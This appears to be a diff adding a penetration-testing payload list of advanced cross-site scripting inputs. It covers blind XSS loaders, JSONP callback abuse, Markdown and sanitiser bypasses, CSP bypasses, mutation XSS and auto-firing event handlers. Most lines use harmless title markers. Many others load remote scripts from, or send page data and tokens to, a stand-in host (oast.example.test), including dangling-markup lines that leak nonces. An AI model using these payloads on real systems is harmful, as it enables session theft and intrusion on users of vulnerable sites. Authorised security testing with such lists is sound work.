@@ -1,0 +1,224 @@
+# Advanced XSS Payloads: Blind, JSONP, Markdown, CSP Bypass, mXSS and Modern Contexts
+# Verify execution in the exact browser and context. Replace oast.example.test with a host you control. Harmless markers only.
+
+# Blind XSS (stored, rendered later in an internal or admin view): callback loader variants
+"><script src=//oast.example.test/b.js></script>
+"><script src=https://oast.example.test/b.js></script>
+'><script src=//oast.example.test/b.js></script>
+</textarea><script src=//oast.example.test/b.js></script>
+</title><script src=//oast.example.test/b.js></script>
+</style><script src=//oast.example.test/b.js></script>
+"><img src=x onerror="var s=document.createElement('script');s.src='//oast.example.test/b.js';document.body.appendChild(s)">
+"><img src=x onerror=import('//oast.example.test/b.js')>
+"><svg onload=import('//oast.example.test/b.js')>
+"><input autofocus onfocus="import('//oast.example.test/b.js')">
+"><details open ontoggle="import('//oast.example.test/b.js')">
+javascript:import('//oast.example.test/b.js')
+"><script>fetch('//oast.example.test/blind?d='+encodeURIComponent(document.domain+'|'+location.href))</script>
+"><img src=x onerror="new Image().src='//oast.example.test/blind?d='+encodeURIComponent(document.domain+'|'+location.href)">
+"><script>navigator.sendBeacon('//oast.example.test/blind',document.domain+'|'+location.href)</script>
+"><script>new Image().src='//oast.example.test/blind?r='+encodeURIComponent(document.referrer)</script>
+"><link rel=stylesheet href=//oast.example.test/blind.css>
+"><iframe src=//oast.example.test/blind.html>
+"><object data=//oast.example.test/blind.html>
+"><meta http-equiv=refresh content="0;url=//oast.example.test/blind">
+
+# Blind XSS in headers and out-of-band fields that internal tools may render
+User-Agent: "><script src=//oast.example.test/b.js></script>
+Referer: https://app.example.test/"><script src=//oast.example.test/b.js></script>
+X-Forwarded-For: "><script src=//oast.example.test/b.js></script>
+Cookie: x="><script src=//oast.example.test/b.js></script>
+Accept-Language: "><script src=//oast.example.test/b.js></script>
+filename="><script src=//oast.example.test/b.js></script>.jpg
+
+# JSONP callback abuse (the callback name is reflected unescaped as JavaScript)
+?callback=document.title='jsonp-marker';//
+?callback=alert
+?callback=alert(1)//
+?callback=top.alert
+?callback=(function(){document.title='jsonp-marker'})
+?callback=jsonp_marker
+?callback=a.b.c
+?callback=a[0]
+?callback=</script><script>document.title='jsonp-marker'</script>
+?callback=/**/document.title='jsonp-marker'//
+?cb=document.title='jsonp-marker';//
+?jsonp=document.title='jsonp-marker';//
+?jsonpcallback=document.title='jsonp-marker';//
+?_callback=document.title='jsonp-marker';//
+?callback=%0d%0a%0d%0adocument.title='jsonp-marker'
+
+# JSONP used to satisfy a CSP script-src allowing a host (load as script from an allowed domain)
+<script src="https://allowed.example.test/jsonp?callback=document.title='csp-jsonp-marker';//"></script>
+<script src="https://allowed.example.test/api?callback=alert"></script>
+<script src="https://www.google.com/complete/search?client=chrome&q=x&jsonp=alert(1)//"></script>
+
+# Markdown renderer XSS (link, image, autolink, raw HTML passthrough)
+[xss](javascript:document.title='md-marker')
+[xss](JaVaScRiPt:document.title='md-marker')
+[xss](java%0ascript:document.title='md-marker')
+[xss](&#106;avascript:document.title='md-marker')
+[xss](javascript&colon;document.title='md-marker')
+[xss](data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC50aXRsZT0nbWQtbWFya2VyJzwvc2NyaXB0Pg==)
+[xss](  javascript:document.title='md-marker')
+[xss]( javascript:document.title='md-marker')
+![x](x"onerror="document.title='md-marker')
+![x](x" onerror="document.title='md-marker')
+![x](javascript:document.title='md-marker')
+![x](https://oast.example.test/x.png "onerror=document.title='md-marker'")
+<javascript:document.title='md-marker'>
+<https://app.example.test"onmouseover="document.title='md-marker'>
+[a]: javascript:document.title='md-marker'
+[click][a]
+<details open ontoggle=document.title='md-marker'>
+<img src=x onerror=document.title='md-marker'>
+<svg><a xlink:href="javascript:document.title='md-marker'"><text x=20 y=20>click</text></a></svg>
+[xss](https://app.example.test/ "title"onmouseover="document.title='md-marker')
+`<img src=x onerror=document.title='md-marker'>`
+<!--<img src="--><img src=x onerror=document.title='md-marker'//">
+*<img src=x onerror=document.title='md-marker'>*
+**<script>document.title='md-marker'</script>**
+> <img src=x onerror=document.title='md-marker'>
+* [x](javascript:document.title='md-marker')
+$$<img src=x onerror=document.title='md-marker'>$$
+:smile:<img src=x onerror=document.title='md-marker'>
+[[javascript:document.title='md-marker']]
+[x](#" onclick="document.title='md-marker')
+
+# CSP bypass: unsafe-inline missing; script gadgets in allow-listed libraries (CSP script-src 'self' or CDN host)
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app ng-csp ng-click=$event.view.document.title='csp-ng-marker'>click</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script><div ng-app ng-csp id=p ng-click=$event.view.document.title='csp-ng-marker'>click</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.14/vue.min.js"></script><div id=app>{{constructor.constructor('document.title="csp-vue-marker"')()}}</div>
+<div data-bind="html:document.title='csp-ko-marker'">
+<script data-main="data:,document.title='csp-require-marker'" src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><div data-ga-event="x"></div>
+
+# CSP bypass: strict-dynamic and nonce reuse / injection
+<script nonce=NONCE_VALUE>document.title='csp-nonce-marker'</script>
+<script src=//oast.example.test/b.js nonce=NONCE_VALUE></script>
+<link rel=prefetch href=//oast.example.test/csp-prefetch>
+<base href=//oast.example.test/>
+<script src=/relative-script.js></script>
+<meta http-equiv="Content-Security-Policy" content="script-src 'none'">
+
+# CSP bypass: dangling markup to steal the nonce or token (no script execution needed)
+<img src='//oast.example.test/steal?
+<img src="//oast.example.test/steal?
+<a href='//oast.example.test/steal?
+<form action='//oast.example.test/steal'><input type=submit value=click><textarea name=x>
+<link rel=stylesheet href='//oast.example.test/steal?
+<base target='
+
+# CSP bypass: missing directives (form-action, base-uri, object-src, frame-ancestors, default-src fallback)
+<form action=//oast.example.test/csp-form method=post><input name=u value=csp-marker><button>send</button></form>
+<object data="data:text/html,<script>document.title='csp-object-marker'</script>"></object>
+<embed src="data:text/html,<script>document.title='csp-embed-marker'</script>">
+<iframe srcdoc="<script>parent.document.title='csp-srcdoc-marker'</script>"></iframe>
+<iframe src="javascript:parent.document.title='csp-iframe-marker'"></iframe>
+
+# CSP bypass: allowed-host user content (script-src allows a host that serves user uploads)
+<script src="https://uploads.allowed.example.test/user-file.js"></script>
+<script src="https://storage.googleapis.com/allowed-bucket/user-file.js"></script>
+<script src="https://allowed.example.test/redirect?to=//oast.example.test/b.js"></script>
+<script src="https://allowed.example.test/%2e%2e%2f/user/upload.js"></script>
+<script src="https://allowed.example.test/path/..%2fother/user.js"></script>
+
+# CSP bypass: Service Worker and script-src 'self' with an upload that serves JavaScript
+navigator.serviceWorker.register('/uploads/sw.js')
+<script src="/uploads/user-file.js"></script>
+<script src="/api/export?format=js&data=document.title%3D%27csp-self-marker%27"></script>
+<script src="/jsonp?callback=document.title='csp-self-marker';//"></script>
+
+# CSP bypass: unsafe-eval (when allowed)
+<script>setTimeout("document.title='csp-eval-marker'")</script>
+<script>new Function("document.title='csp-eval-marker'")()</script>
+<script>eval("document.title='csp-eval-marker'")</script>
+
+# Mutation XSS (mXSS): input that is safe when sanitised but mutates when reparsed through innerHTML
+<noscript><p title="</noscript><img src=x onerror=document.title='mxss-marker'>">
+<svg></p><style><a id="</style><img src=1 onerror=document.title='mxss-marker'>">
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=document.title='mxss-marker'&gt;">
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=document.title='mxss-marker'>
+<math><mi xlink:href="data:x,<script>document.title='mxss-marker'</script>">
+<svg><desc><![CDATA[</desc><script>document.title='mxss-marker'</script>]]></svg>
+<svg><style><img src=x onerror=document.title='mxss-marker'></style></svg>
+<table><colgroup><style><img src=x onerror=document.title='mxss-marker'></style></colgroup></table>
+<svg><foreignObject><p><style></p><img src=x onerror=document.title='mxss-marker'></style></foreignObject></svg>
+<listing>&lt;img src=x onerror=document.title='mxss-marker'&gt;</listing>
+<xmp><p title="</xmp><img src=x onerror=document.title='mxss-marker'>">
+<a href="&#x6a;avascript:document.title='mxss-marker'">x</a>
+<p id="</p><img src=x onerror=document.title='mxss-marker'>">
+<style><style/><img src=x onerror=document.title='mxss-marker'>
+<div><style><div></style><img src=x onerror=document.title='mxss-marker'>
+<select><template><style><!--</style></template><img src=x onerror=document.title='mxss-marker'>-->
+
+# Sanitiser configuration probes (what the allow-list permits)
+<a href=# onclick=document.title='san-marker'>x</a>
+<a href="javascript:document.title='san-marker'">x</a>
+<img src=x onerror=document.title='san-marker'>
+<svg onload=document.title='san-marker'>
+<math href="javascript:document.title='san-marker'">x</math>
+<iframe srcdoc="<script>parent.document.title='san-marker'</script>"></iframe>
+<form action="javascript:document.title='san-marker'"><button>x</button></form>
+<button formaction="javascript:document.title='san-marker'" form=f>x</button>
+<input type=image src=x onerror=document.title='san-marker'>
+<video><source onerror=document.title='san-marker'>
+<audio src onerror=document.title='san-marker'>
+<body onpageshow=document.title='san-marker'>
+<style>@import 'data:,*%7bx:expression(document.title=%27san-marker%27)%7d';</style>
+<template><script>document.title='san-marker'</script></template>
+
+# DOM clobbering against sanitisers (see also DOM-Based-Attacks)
+<form id=x><input id=attributes>
+<img name=attributes>
+<form><input name=nodeName>
+<form><input name=firstChild>
+<img name=children>
+
+# Dynamic import and modern JavaScript execution contexts
+import('data:text/javascript,document.title="import-marker"')
+import('//oast.example.test/b.js')
+<script type=module>import('//oast.example.test/b.js')</script>
+<script type=module>document.title='module-marker'</script>
+<script type=importmap>{"imports":{"x":"data:text/javascript,document.title='importmap-marker'"}}</script><script type=module>import 'x'</script>
+<script type=speculationrules>{"prefetch":[{"source":"list","urls":["//oast.example.test/speculation"]}]}</script>
+<script>Function`document.title='tagged-marker'```</script>
+<script>[].constructor.constructor`document.title='tagged-marker'```</script>
+<script>setTimeout`document.title='tagged-marker'`</script>
+<script>window['al'+'ert']`xss`</script>
+<script>self['ale'+'rt'](1)</script>
+<script>(()=>document.title='arrow-marker')()</script>
+<script>location='javascript:document.title=%27loc-marker%27'</script>
+<script>constructor.constructor('document.title="ctor-marker"')()</script>
+<script>[]['filter']['constructor']('document.title="jsfuck-marker"')()</script>
+<script>$=1;`${document.title='tpl-marker'}`</script>
+<script>with(document)title='with-marker'</script>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>Reflect.apply(alert,window,[1])</script>
+
+# Event handlers that fire without user interaction (HTML contexts that strip common handlers)
+<body onload=document.title='ev-marker'>
+<svg onload=document.title='ev-marker'>
+<img src=x onerror=document.title='ev-marker'>
+<input autofocus onfocus=document.title='ev-marker'>
+<select autofocus onfocus=document.title='ev-marker'>
+<textarea autofocus onfocus=document.title='ev-marker'>
+<keygen autofocus onfocus=document.title='ev-marker'>
+<details open ontoggle=document.title='ev-marker'>
+<video src=x onloadstart=document.title='ev-marker'>
+<audio controls ondurationchange=document.title='ev-marker'><source src=1.mp3></audio>
+<marquee onstart=document.title='ev-marker'>
+<div style="animation-name:x" onanimationstart=document.title='ev-marker'><style>@keyframes x{}</style></div>
+<div style="transition:1s" ontransitionend=document.title='ev-marker'><style>div{width:1px}div:hover{width:2px}</style></div>
+<a id=x tabindex=1 onfocusin=document.title='ev-marker'></a>
+<iframe onload=document.title='ev-marker'>
+<object onerror=document.title='ev-marker'>
+<form onformdata=document.title='ev-marker'><button>x</button></form>
+<div contenteditable onbeforeinput=document.title='ev-marker'>x</div>
+<div popover id=p onbeforetoggle=document.title='ev-marker'></div><button popovertarget=p>x</button>
+<img src=x onerror=document.title='ev-marker' loading=lazy>
+<body onpointerrawupdate=document.title='ev-marker'>
+<xss onbeforescriptexecute=document.title='ev-marker'><script>1</script></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend=document.title='ev-marker'></xss>
